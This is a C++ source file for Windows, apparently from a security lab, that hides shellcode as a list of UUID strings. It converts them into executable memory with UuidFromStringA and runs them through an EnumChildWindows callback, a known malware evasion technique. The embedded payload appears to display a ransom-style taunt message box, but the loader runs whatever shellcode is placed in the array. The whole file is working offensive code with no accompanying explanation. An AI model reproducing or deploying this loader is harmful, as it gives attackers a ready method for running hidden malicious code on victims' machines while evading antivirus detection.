#include <windows.h>
#include <rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
"e48148fc-fff0-ffff-e8d0-000000415141",
"56515250-3148-65d2-488b-52603e488b52",
"8b483e18-2052-483e-8b72-503e480fb74a",
"c9314d4a-3148-acc0-3c61-7c022c2041c1",
"01410dc9-e2c1-52ed-4151-3e488b52203e",
"483c428b-d001-8b3e-8088-0000004885c0",
"01486f74-50d0-8b3e-4818-3e448b402049",
"5ce3d001-ff48-3ec9-418b-34884801d64d",
"3148c931-acc0-c141-c90d-4101c138e075",
"034c3ef1-244c-4508-39d1-75d6583e448b",
"01492440-66d0-413e-8b0c-483e448b401c",
"3ed00149-8b41-8804-4801-d0415841585e",
"58415a59-5941-5a41-4883-ec204152ffe0",
"5a594158-483e-128b-e949-ffffff5d3e48",
"01418d8d-0000-ba41-4c77-2607ffd549c7",
"000000c1-3e00-8d48-950e-0100003e4c8d",
"00013285-4800-c931-41ba-45835607ffd5",
"41c93148-f0ba-a2b5-56ff-d548692c4920",
"4c206d61-7a61-7261-7573-2e4769766520",
"7920656d-756f-2072-6d6f-6e6579210047",
"74736f68-5720-6c6f-6620-4c6162007573",
"32337265-642e-6c6c-0090-909090909090"
};

int main() {
  int elems = sizeof(uuids) / sizeof(uuids[0]);
  VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
  DWORD_PTR hptr = (DWORD_PTR)mem;
  for (int i = 0; i < elems; i++) {
    RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
    RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
    if (status != RPC_S_OK) {
      printf("[-] UUID Convert Error\n");
      CloseHandle(mem);
      return -1;
    }
     hptr += 16;
  }

  EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
  CloseHandle(mem);
  return 0;
}
